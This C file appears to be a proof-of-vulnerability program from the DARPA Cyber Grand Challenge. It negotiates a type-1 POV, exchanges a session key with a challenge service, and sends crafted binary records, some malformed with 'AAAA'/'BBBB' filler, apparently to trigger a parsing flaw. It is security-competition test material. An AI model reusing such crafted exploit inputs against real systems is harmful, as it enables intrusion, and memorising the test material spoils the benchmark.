#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x11\x00\x00\x00\x00\x49\x5f\x41\x4d\x5f\x59\x4f\x55\x52\x5f\x46"
         "\x41\x54\x48\x45\x52";
      static unsigned int write_00000_00000_len = 21;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** length read
      read_00000_len = 1;
      read_00000 = (unsigned char*)cgc_malloc(read_00000_len);
      int read_00000_res = cgc_length_read(0, read_00000, read_00000_len);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x00";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 1);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** length read
      read_00001_len = 4;
      read_00001 = (unsigned char*)cgc_malloc(read_00001_len);
      int read_00001_res = cgc_length_read(0, read_00001, read_00001_len);
      if (read_00001_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00001_00000[] = 
         "\x10\x00\x00\x00";
      read_00001_ptr += cgc_data_match(read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, match_00001_00000, 4);
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** length read
      read_00002_len = 16;
      read_00002 = (unsigned char*)cgc_malloc(read_00002_len);
      int read_00002_res = cgc_length_read(0, read_00002, read_00002_len);
      if (read_00002_res) {} //silence unused variable warning
      //**** read assign to var "skey" from pcre: (.*)
      static char read_00002_regex[] = 
         "\x28\x2e\x2a\x29";
      cgc_assign_from_pcre("skey", read_00002, read_00002_len - read_00002_ptr, read_00002_regex, 0);
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\xc5\x00\x00\x00\x02";
      static unsigned int write_00001_00000_len = 5;
      static unsigned char write_00001_00002[] = 
         "\x05\x00\x00\x00\x8f\xce\x2e\x9e\x55\xf8\x15\x34\x61\x62\x63\x64"
         "\x31\x32\x33\x00\x00\x00\x01\x00\x00\x00\x64\x00\x00\x00\x8f\xce"
         "\x2e\x9e\x55\xf8\x15\x34\x61\x62\x63\x64\x34\x35\x36\x00\x00\x00"
         "\x02\x00\x00\x00\x65\x00\x00\x00\x8f\xce\x2e\x9e\x55\xf8\x15\x34"
         "\x61\x62\x63\x64\x37\x38\x39\x00\x00\x00\x03\x00\x00\x00\x66\x00"
         "\x00\x00\x8f\xce\x2e\x9e\x55\xf8\x15\x34\x61\x62\x63\x64\x30\x30"
         "\x30\x00\x00\x00\x04\x00\x00\x00\x67\x00\x00\x00\x8f\xce\x2e\x9e"
         "\x55\xf8\x15\x34\x62\x62\x62\x62\x31\x32\x33\x00\x00\x00\x05\x00"
         "\x00\x00\x68\x00\x00\x00\x8f\xce\x2e\x9e\x55\xf8\x15\x34\x41\x41"
         "\x41\x41\x41\x31\x32\x33\x00\x00\x42\x42\x42\x42\x6a\x00\x00\x00"
         "\x8f\xce\x2e\x5e\x55\xf8\x15\x9f\x4c\x4f\x4c\x5a\x32\x30\x33\x34"
         "\x00\x00\x43\x43";
      static unsigned int write_00001_00002_len = 180;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      write_00001 = cgc_append_var("skey", write_00001, &write_00001_len);
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00002, write_00001_00002_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** length read
      read_00003_len = 139;
      read_00003 = (unsigned char*)cgc_malloc(read_00003_len);
      int read_00003_res = cgc_length_read(0, read_00003, read_00003_len);
      if (read_00003_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00003_00000[] = 
         "\x00\x86\x00\x00\x00\x07\x00\x00\x00\x8f\xce\x2e\x9e\x55\xf8\x15"
         "\x34\x61\x62\x63\x64\x31\x32\x33\x00\x00\x00\x01\x00\x00\x00\x64"
         "\x00\x00\x00\x8f\xce\x2e\x9e\x55\xf8\x15\x34\x61\x62\x63\x64\x34"
         "\x35\x36\x00\x00\x00\x02\x00\x00\x00\x65\x00\x00\x00\x8f\xce\x2e"
         "\x9e\x55\xf8\x15\x34\x61\x62\x63\x64\x37\x38\x39\x00\x00\x00\x03"
         "\x00\x00\x00\x66\x00\x00\x00\x8f\xce\x2e\x9e\x55\xf8\x15\x34\x61"
         "\x62\x63\x64\x30\x30\x30\x00\x00\x00\x04\x00\x00\x00\x67\x00\x00"
         "\x00\x8f\xce\x2e\x9e\x55\xf8\x15\x34\x62\x62\x62\x62\x31\x32\x33"
         "\x00\x00\x00\x05\x00\x00\x00\x68\x00\x00\x00";
      read_00003_ptr += cgc_data_match(read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, match_00003_00000, 139);
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
}
